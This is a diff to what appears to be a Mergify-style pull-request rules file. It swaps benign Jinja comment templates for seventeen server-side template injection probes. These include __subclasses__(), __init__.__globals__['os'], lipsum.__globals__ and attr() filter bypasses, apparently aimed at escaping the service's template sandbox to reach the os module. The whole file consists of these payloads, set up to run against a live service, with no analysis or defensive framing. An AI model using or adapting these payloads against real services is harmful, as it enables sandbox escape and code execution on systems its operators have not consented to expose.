@@ -1,127 +1,154 @@
 pull_request_rules:
-  - name: A1
+  - name: B1
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A1=[
-          {{ author.__class__ }}
+          B1=[
+          {{ author.__class__.__mro__ }}
           ]
-  - name: A2
+  - name: B2
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A2=[
-          {{ author|attr("__class__") }}
+          B2=[
+          {{ author.__class__.__base__.__subclasses__() }}
           ]
-  - name: A3
+  - name: B3
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A3=[
-          {{ self }}
+          B3=[
+          {{ author|attr("__class__")|attr("__mro__") }}
           ]
-  - name: A4
+  - name: B4
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A4=[
-          {{ lipsum }}
+          B4=[
+          {{ self.__init__.__globals__ }}
           ]
-  - name: A5
+  - name: B5
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A5=[
-          {{ cycler }}
+          B5=[
+          {{ author.__init__.__globals__["os"] }}
           ]
-  - name: A6
+  - name: B6
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A6=[
-          {{ namespace }}
+          B6=[
+          {{ ""["__class__"] }}
           ]
-  - name: A7
+  - name: B7
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A7=[
-          {{ config }}
+          B7=[
+          {{ author.__class__.__base__.__subclasses__()[0] }}
           ]
-  - name: A8
+  - name: B8
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A8=[
-          {{ ""|attr("__class__") }}
+          B8=[
+          {{ author.format }}
           ]
-  - name: A9
+  - name: B9
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A9=[
-          {{ author|upper }}
+          B9=[
+          {{ author|attr("format") }}
           ]
-  - name: A10
+  - name: B10
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A10=[
+          B10=[
+          {{ author.__getattribute__("__class__") }}
+          ]
+  - name: B11
+    conditions:
+      - -closed
+    actions:
+      comment:
+        message: |
+          B11=[
+          {{ author|join }}
+          ]
+  - name: B12
+    conditions:
+      - -closed
+    actions:
+      comment:
+        message: |
+          B12=[
+          {{ author|safe }}
+          ]
+  - name: B13
+    conditions:
+      - -closed
+    actions:
+      comment:
+        message: |
+          B13=[
+          {{ author|tojson }}
+          ]
+  - name: B14
+    conditions:
+      - -closed
+    actions:
+      comment:
+        message: |
+          B14=[
           {{ author|map("upper")|list }}
           ]
-  - name: A11
+  - name: B15
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A11=[
-          {% for i in range(2) %}X{{ i }}{% endfor %}
+          B15=[
+          {{ [author]|sort(attribute="__class__") }}
           ]
-  - name: A12
+  - name: B16
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A12=[
-          {% set x=1 %}{{ x }}
+          B16=[
+          {{ author|select("string")|list }}
           ]
-  - name: A13
+  - name: B17
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          A13=[
-          {{ author.upper() }}
-          ]
-  - name: A14
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          A14=[
-          {{ dict(a=1) }}
+          B17=[
+          {{ lipsum.__globals__ }}
           ]
